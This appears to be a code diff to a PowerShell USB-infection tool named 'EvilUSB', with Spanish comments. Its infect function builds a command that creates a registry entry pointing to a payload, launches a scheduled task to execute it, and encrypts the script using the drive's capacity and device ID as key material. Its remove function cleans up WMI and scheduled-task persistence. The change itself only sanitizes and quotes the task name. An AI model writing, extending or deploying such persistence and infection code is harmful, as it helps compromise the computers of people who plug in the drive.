@@ -328,7 +328,7 @@ Function EvilUSB:Infect {
 		# Crear una clave en el registro con la ruta al payload
 	$Command += 'New-ItemProperty -Pa ' + $Global:Settings.Persistence.ScheduleTask.Registry.Path + ' -N ' + $Global:Settings.Persistence.ScheduleTask.Registry.Name + ' -Pr 0 -Va $N.FullName -Fo;'
 		# Iniciar la tarea programada (que se encargará de ejecutar el payload)
-	$Command += 'schtasks.exe /RUN /TN ' + $Global:Settings.Persistence.ScheduleTask.TaskName + '}'
+	$Command += 'schtasks.exe /RUN /TN ' + ('"' + $Global:Settings.Persistence.ScheduleTask.TaskName.Replace('"','') + '"') + '}'
 	
 	# Encriptar el script usando la capacidad del dispositivo como contraseña y el ID como salto
 	$Cipher = Encrypt -Plain ([Text.Encoding]::UTF8.GetBytes($Command)) -Password $Global:Volume.Capacity -SALT ([Text.Encoding]::UTF8.GetBytes($Global:Volume.DeviceID))
@@ -457,7 +457,7 @@ Function EvilUSB:Remove {
     $WMIScriptSource = $WMIScriptSource.Replace('$FilterName', $Global:Settings.Persistence.WMI.FilterName).Replace('$ConsumerName', $Global:Settings.Persistence.WMI.ConsumerName)
 
 	$ScheduleTaskScriptSource = Get-Content .\data\scripts_source\Remove-ScheduleTask-Persistence.ps1 | Out-String
-	$ScheduleTaskScriptSource = $ScheduleTaskScriptSource.Replace('TaskName',$Global:Settings.Persistence.ScheduleTask.TaskName)
+	$ScheduleTaskScriptSource = $ScheduleTaskScriptSource.Replace('TaskName','"' + $Global:Settings.Persistence.ScheduleTask.TaskName.Replace('"','') + '"')
 
 	$ScriptSource = $WMIScriptSource + $ScheduleTaskScriptSource
     
